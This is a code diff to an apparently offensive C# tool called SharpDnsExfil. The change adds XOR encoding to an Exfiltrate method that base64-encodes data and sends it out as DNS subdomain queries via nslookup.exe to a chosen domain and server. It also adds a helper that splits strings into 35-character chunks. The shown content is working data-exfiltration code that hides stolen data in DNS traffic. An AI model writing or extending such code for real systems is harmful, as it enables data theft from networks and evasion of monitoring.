@@ -11,11 +11,15 @@ namespace SharpDnsExfil.Utils
     class Utilities
     {
 
-        public void Exfiltrate(byte[] rawData, string Domain, string Server, bool Verbose)
+        public void Exfiltrate(byte[] rawData, string Domain, string Server, bool Verbose, bool encode=true)
         {
+            if(encode)
+            {
+                rawData = EncryptionUtils.xorEncDec(rawData, Program.xorKey);
+            }
+
             string data = Convert.ToBase64String(rawData);
-            //Console.WriteLine(data);
-            //Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(data)));
+            
             string strCmd = $@"/c nslookup.exe -norecurse -query=AAAA {data}.{Domain} {Server} > nul";
             
             Logger.WriteLine($"{data}.{Domain}", Verbose);
@@ -37,9 +41,15 @@ namespace SharpDnsExfil.Utils
         public long GetFileSize(string filePath)
         {
             var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
-            Program.totalSize = fs.Length;
 
             return fs.Length;
+        }
+
+        public IEnumerable<string> SplitString(string str)
+        {
+            const int chunkSize = 35;
+            for (int i = 0; i < str.Length; i += chunkSize)
+                yield return str.Substring(i, Math.Min(chunkSize, str.Length - i));
         }
 
         //https://github.com/nognomar/AppCenterClient/blob/b852e3eeb6dbee92ff771987a98449447084f3c8/src/Commands/AppCenterUploadApplicationService.cs#L104
